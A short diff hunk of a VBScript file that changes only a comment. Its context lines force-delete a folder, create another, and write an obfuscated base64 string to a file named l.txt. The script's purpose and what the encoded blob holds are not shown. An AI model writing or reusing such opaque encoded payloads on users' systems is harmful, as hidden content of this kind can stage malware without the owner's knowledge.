@@ -15,7 +15,7 @@ If fso.FolderExists(grok_l) Then fso.DeleteFolder grok_l, True
 ' Create new folder
 If Not fso.FolderExists(paged_l) Then fso.CreateFolder(paged_l)
 
-' Create l.txt
+' Create l.txt with new content
 Set file1 = fso.CreateTextFile(paged_l & "\l.txt", True)
 file1.WriteLine "BhsDHhxNQUAQBxsfGw1ZDQAaQQAHA1sYHgJDQRwWAx8bC0AFDxhYAw4eAEASAAwYCgoTQBsPGg=="
 file1.Close
